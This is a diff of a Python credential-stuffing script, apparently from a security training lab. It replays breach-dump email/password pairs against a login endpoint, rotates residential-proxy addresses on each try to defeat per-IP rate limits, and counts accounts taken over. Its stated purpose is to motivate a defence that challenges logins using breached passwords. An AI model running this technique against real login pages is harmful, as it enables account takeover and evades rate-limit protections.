@@ -1,57 +1,42 @@
-"""Round 1 attack — distributed credential stuffing.
+"""
+Round 1 attack: a distributed credential stuffer.
 
-The economy: test breach-dump combos against /login. The generic per-IP rate
-limit is defeated the cheap way — rotate the claimed egress every request, so the
-counter never builds. The stuffer stays low-and-slow and simply replays known
-passwords. Its hits are, by definition, breached passwords; that is the tell the
-Round 1 defense turns against it.
+The economy: replay breach-dump pairs against POST /api/login and keep the ones that open a session.
+The generic per-IP bucket is beaten the cheap way: every attempt rents the next address of a
+residential-proxy fleet (world.json's `residential_proxy_net`, 384 addresses), so no counter builds.
+The stuffer is low and slow in the only sense that matters here: one try per account.
 
-    python attacks/round1_stuffer.py            # full combo list
-    python attacks/round1_stuffer.py --limit 200
+What it cannot hide: its hits are breached passwords. A combo list IS a breach dump, so every pair
+that works uses a password that is in the corpus. Round 1 turns exactly those logins into a code
+challenge. (W2 Ch6 is the full stuffing arms race; this chapter takes just that one economic fact.)
+
+    python attacks/round1_stuffer.py
 """
 
-from __future__ import annotations
+import itertools
 
-import argparse
-import os
-import random
-import sys
-import time
+from _common import LIB_HEADERS, LabClient, combo_list, map_threads, report, world_pool
 
-import requests
-
-sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
-from _common import BASE_URL, DATA, RESIDENTIAL, headers, rand_ip, require_local
+ACTOR = "bot:stuffer"
 
 
-def run(limit=None, delay=0.0, base=BASE_URL):
-    require_local(base)
-    rng = random.Random(1)
-    with open(os.path.join(DATA, "combo_list.txt")) as fh:
-        combos = [ln.strip().split(":", 1) for ln in fh if ":" in ln]
-    if limit:
-        combos = combos[:limit]
-    tally = {"allow": 0, "challenge": 0, "invalid": 0, "block": 0}
-    takeovers = []
-    for email, pw in combos:
-        ip = rand_ip(RESIDENTIAL, rng)   # rotate egress -> defeats per-IP rate limit
-        r = requests.post(f"{base}/login", json={"email": email, "password": pw},
-                          headers=headers("bot", ip), timeout=5)
-        outcome = r.json().get("outcome", "?")
-        tally[outcome] = tally.get(outcome, 0) + 1
-        if outcome == "allow":
-            takeovers.append(email)        # a bare session: full account takeover
-        if delay:
-            time.sleep(delay)
-    print(f"[stuffer] {len(combos)} attempts -> {tally}")
-    print(f"[stuffer] account takeovers (sessions granted): {len(takeovers)}")
-    return tally
+def run():
+    fleet = itertools.cycle(world_pool("residential_proxy_net"))      # next() is atomic enough for a lab
+    pairs, hits, challenged = combo_list(), [], []
+
+    def attempt(pair):
+        r = LabClient(ACTOR, ip=next(fleet)).post("/api/login", json={"email": pair[0], "password": pair[1]}, headers=LIB_HEADERS)
+        if r.status_code == 200 and r.json().get("ok"):
+            hits.append(pair[0])                              # a bare session: a full account takeover
+        elif r.status_code == 403 and "challenge_required" in r.text:
+            challenged.append(pair[0])                        # the password was right; the store wants a code
+    map_threads(attempt, pairs)
+    return {"attacker": ACTOR, "attempted": len(pairs), "succeeded": len(hits), "accounts_taken_over": len(hits),
+            "right_password_but_challenged": len(challenged)}
 
 
 if __name__ == "__main__":
-    ap = argparse.ArgumentParser()
-    ap.add_argument("--limit", type=int, default=None)
-    ap.add_argument("--delay", type=float, default=0.0)
-    ap.add_argument("--url", default=BASE_URL)
-    a = ap.parse_args()
-    run(limit=a.limit, delay=a.delay, base=a.url)
+    out = run()
+    print(f"[{ACTOR}] {out['attempted']} pairs -> {out['accounts_taken_over']} accounts taken over, "
+          f"{out['right_password_but_challenged']} right passwords met a code challenge")
+    report(**out)
